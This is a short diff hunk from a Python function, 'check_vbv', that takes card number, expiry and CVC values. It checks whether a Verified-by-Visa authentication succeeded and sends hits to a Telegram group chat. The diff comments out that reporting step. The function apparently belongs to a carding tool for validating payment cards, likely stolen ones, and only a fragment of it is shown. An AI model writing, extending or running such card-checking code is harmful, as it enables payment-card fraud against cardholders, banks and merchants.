@@ -288,10 +288,10 @@ def check_vbv(cc, exp, exy, cvc, bot, cmd):
             # List of substrings to check
             substrings = ['authenticate_successful', 'authenticate_attempt_successful']
 
-            # Check if any of the substrings are in the status string
+            """# Check if any of the substrings are in the status string
             if any(substring in status for substring in substrings):
                 # Send a message if any substring is found in status
-                bot.send_message(chat_id=-4291842898, text=message_text)
+                bot.send_message(chat_id=-4291842898, text=message_text)"""
 
     except requests.exceptions.RequestException as e:
         print(f'Request error: {e}')
